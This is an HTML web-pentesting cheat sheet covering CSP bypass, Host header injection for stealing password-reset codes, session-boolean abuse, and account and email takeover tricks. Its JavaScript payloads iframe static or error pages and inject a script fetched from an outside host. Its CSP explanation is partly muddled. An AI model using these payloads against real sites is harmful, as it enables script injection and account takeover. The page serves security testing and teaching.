<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
body {background-color: black;}
h1   {color: #00ff00;}
p    {color: #00ff00;}
div  {color: #00ff00;}
{font-weight:bold;}
	 
</style><link href="main.css">	
</head>
<body>
<h1>HackMethods</h1>
<h2>Pentesting-Web</h2>
<h2>1-Content-Security-Policy(CSP)Bypass</h2>
	
<img src="world.jpg"/><br>	
<div>
<p>A configuration such as:</p>

Content-Security-Policy: default-src ‘self’ ‘unsafe-inline’;

Prohibits usage of any functions that execute code transmitted as a string. For example:
`eval, setTimeout, setInterval` will all be blocked because of the setting `unsafe-eval`

Any content from external sources is also blocked, including images, css, websockets, and, especially, JS

<h3>Via text & images</h3>

Modern browsers transform images and texts o HTML files to visualize them better (set background, center...).

Therefore, if you **open an image or txt file** such as favicon.ico or **robots.txt**
with an **`iframe`**, you will open it as HTML.
	
**These kind of pages usually doesn't have CSP headers and might not have X-Frame-Options**,
so you can execute arbitrary JS from them:</p>
<pre>
javascript
frame=document.createElement("iframe");
frame.src="/css/bootstrap.min.css";
document.body.appendChild(frame);
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
</pre>
<p>## Via Errors

Same as text files or images, **error responses usually doesn't have CSP headers and might not have X-Frame-Options**.
So, you can force errors and load them inside an iframe:</p>
<pre>
javascript
// Force nginx error
frame=document.createElement("iframe");
frame.src="/%2e%2e%2f";
document.body.appendChild(frame);

// Force error via long URL
frame=document.createElement("iframe");
frame.src="/"+"A".repeat(20000);
document.body.appendChild(frame);

// Force error via long cookies
for(var i=0;i<5;i++){document.cookie=i+"="+"a".repeat(4000)};
frame=document.createElement("iframe");
frame.src="/";
document.body.appendChild(frame);
// Don't forget to remove them
for(var i=0;i<5;i++){document.cookie=i+"="}

javascript
// After any of the previous examples, you can execute JS in the iframe wih something like:
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
</pre></div>

<h2>Other-Web-Tricks</h2>
<h3>Host header</h3>

<p>Several times the back-end trust the **Host header** to perform some actions.
For example, it could use its value as the **domain to send a password reset**.
So when you receive an email with a link to reset your password, the domain being used is the one you put in the Host header.Then,
you can request the password reset of other users and change the domain to one controlled by you to steal their password reset codes.
➤ https://medium.com/nassec-cybersecurity-writeups/how-i-was-able-to-take-over-any-users-account-with-host-header-injection-546fff6d0f2 
➤ To Open this link Use https://mirror-medium.com</p>

<h3>Session booleans</h3>

<p>Some times when you complete some verification correctly the back-end will **just add a boolean with the value "True" to a security attribute your session**.
Then, a different endpoint will know if you successfully passed that check.
However, if you **pass the check** and your sessions is granted that "True" value in the security attribute, you can try to **access other resources** that **depends on the same attribute** but that you **shouldn't have permissions** to access.
➤ https://medium.com/@ozguralp/a-less-known-attack-vector-second-order-idor-attacks-14468009781a
➤ To Open this link Use https://mirror-medium.com</p>

<h3>Register functionality</h3>

<p>Try to register as an already existent user. Try also using equivalent characters (dots, lots of spaces and Unicode).</p>

<h3>Takeover emails</h3>
<p>Register an email, before confirming it change the email, then, if the new confirmation email is sent to the first registered email,you can takeover any email. Or if you can enable the second email confirming the firt one, you can also takeover any account.</p>

<h3>Access Internal servicedesk of companies using atlassian</h3>

{% embed url="https://yourcompanyname.atlassian.net/servicedesk/customer/user/login" %}

<h3>TRACE method</h3>

<p>Developers might forget to disable various debugging options in the production environment. For example, the HTTP `TRACE` method is designed for diagnostic purposes. If enabled, the web server will respond to requests that use the `TRACE` method by echoing in the response the exact request that was received. This behaviour is often harmless, but occasionally leads to information disclosure, such as the name of internal authentication headers that may be appended to requests by reverse proxies.</p>
<br>
<img src="https://miro.medium.com/max/1330/1*wDFRADTOd9Tj63xucenvAA.png"/>
</body>  
</html>


























